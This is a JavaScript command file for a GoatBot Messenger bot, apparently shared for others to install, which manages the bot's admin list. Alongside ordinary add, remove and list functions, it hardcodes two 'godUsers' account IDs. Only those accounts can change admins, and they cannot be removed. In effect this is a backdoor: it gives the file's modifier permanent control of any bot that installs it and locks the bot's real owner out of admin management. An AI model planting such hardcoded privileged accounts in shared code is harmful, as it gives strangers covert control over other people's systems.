!cmd install adminn.js const { config } = global.GoatBot;
const { writeFileSync } = require("fs-extra");

module.exports = {
  config: {
    name: "admin",
    version: "2.7",
    author: "NTKhang + Modified by Zihad",
    countDown: 5,
    role: 0,
    category: "system",
    shortDescription: { en: "Manage bot admins" },
    longDescription: { en: "Add, remove, or list bot administrators." },
    guide: {
      en: '{pn} add <uid | @tag>: Add new admin' +
          '\n{pn} remove <uid | @tag>: Remove admin' +
          '\n{pn} list: List all admins'
    }
  },

  langs: {
    en: {
      added: `╭━━━ [ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥 ] ━━━╮\n%1\n╰━━━━━━━━━━━━━━━╯`,
      removed: `╭━━━ [ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝 ] ━━━╮\n%1\n╰━━━━━━━━━━━━━━━╯`,
      alreadyAdmin: `╭━━━ [ 𝐖𝐚𝐫𝐧𝐢𝐧𝐠 ] ━━━╮\n┃ ⚠ Already an Admin!\n╰━━━━━━━━━━━━━━━╯`,
      notAdmin: "┃ ⚠ This user is not an Admin.",
      missingId: "┃ ⚠ Please provide a UID or Tag a user.",
      onlyAdmin: "╭━━━ [ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 ] ━━━╮\n┃ ❌ You do not have permission\n┃ ❌ to use this command!\n╰━━━━━━━━━━━━━━━╯",
      listTitle: `╭━━━ [ 𝐀𝐝𝐦𝐢𝐧 𝐋𝐢𝐬𝐭 ] ━━━╮\n%1\n╰━━━━━━━━━━━━━━━╯`
    }
  },

  onStart: async function ({ message, args, usersData, event, getLang }) {
    const { senderID, mentions, messageReply, threadID } = event;
    
    // 🛠 FANCY FONT CONVERTER
    const makeFancy = (text) => {
      const fonts = {
        'A': '𝐀', 'B': '𝐁', 'C': '𝐂', 'D': '𝐃', 'E': '𝐄', 'F': '𝐅', 'G': '𝐆', 'H': '𝐇', 'I': '𝐈', 'J': '𝐉', 'K': '𝐊', 'L': '𝐋', 'M': '𝐌', 'N': '𝐍', 'O': '𝐎', 'P': '𝐏', 'Q': '𝐐', 'R': '𝐑', 'S': '𝐒', 'T': '𝐓', 'U': '𝐔', 'V': '𝐕', 'W': '𝐖', 'X': '𝐗', 'Y': '𝐘', 'Z': '𝐙',
        'a': '𝐚', 'b': '𝐛', 'c': '𝐜', 'd': '𝐝', 'e': '𝐞', 'f': '𝐟', 'g': '𝐠', 'h': '𝐡', 'i': '𝐢', 'j': '𝐣', 'k': '𝐤', 'l': '𝐥', 'm': '𝐦', 'n': '𝐧', 'o': '𝐨', 'p': '𝐩', 'q': '𝐪', 'r': '𝐫', 's': '𝐬', 't': '𝐭', 'u': '𝐮', 'v': '𝐯', 'w': '𝐰', 'x': '𝐱', 'y': '𝐲', 'z': '𝐳'
      };
      return text.split('').map(char => fonts[char] || char).join('');
    };

    // 🔒 SUPER ADMINS
    const godUsers = ["61579049651471", "100087512984176"];

    // 1. ADMIN LIST
    if (args[0] === "list" || args[0] === "-l") {
      const listAdmins = await Promise.all(config.adminBot.map(async (id) => {
        const name = await usersData.getName(id);
        return `┃ 👤 ${makeFancy(name)}\n┃ 🆔 ${id}`;
      }));
      return message.reply(getLang("listTitle", listAdmins.join("\n┃ ━━━━━━━━━━━━━\n")));
    }

    // STRICT PERMISSION CHECK
    if (!godUsers.includes(senderID)) return message.reply(getLang("onlyAdmin"));

    // 2. GET UIDs
    let uids = [];
    if (Object.keys(mentions).length > 0) uids = Object.keys(mentions);
    else if (messageReply) uids.push(messageReply.senderID);
    else if (args[1] && !isNaN(args[1])) uids.push(args[1]);

    if (uids.length === 0) return message.reply(getLang("missingId"));

    // 3. ADD ADMIN
    if (args[0] === "add" || args[0] === "-a") {
      let addedNames = [];
      for (const id of uids) {
        if (!config.adminBot.includes(id)) {
          config.adminBot.push(id);
          const name = await usersData.getName(id);
          addedNames.push(`┃ ✅ 𝐀𝐝𝐝𝐞𝐝: ${makeFancy(name)}\n┃ 🆔 𝐔𝐈𝐃: ${id}`);
        }
      }
      if (addedNames.length > 0) {
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        return message.reply(getLang("added", addedNames.join("\n")));
      } else {
        return message.reply(getLang("alreadyAdmin"));
      }
    }

    // 4. REMOVE ADMIN
    if (args[0] === "remove" || args[0] === "-r") {
      let removedNames = [];
      for (const id of uids) {
        if (config.adminBot.includes(id)) {
          if (godUsers.includes(id)) continue; // Can't remove God Users
          const index = config.adminBot.indexOf(id);
          config.adminBot.splice(index, 1);
          const name = await usersData.getName(id);
          removedNames.push(`┃ ❌ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: ${makeFancy(name)}\n┃ 🆔 𝐔𝐈𝐃: ${id}`);
        }
      }
      if (removedNames.length > 0) {
        writeFileSync(global.client.dirConfig, JSON.stringify(config, null, 2));
        return message.reply(getLang("removed", removedNames.join("\n")));
      } else {
        return message.reply(getLang("notAdmin"));
      }
    }
  }
};
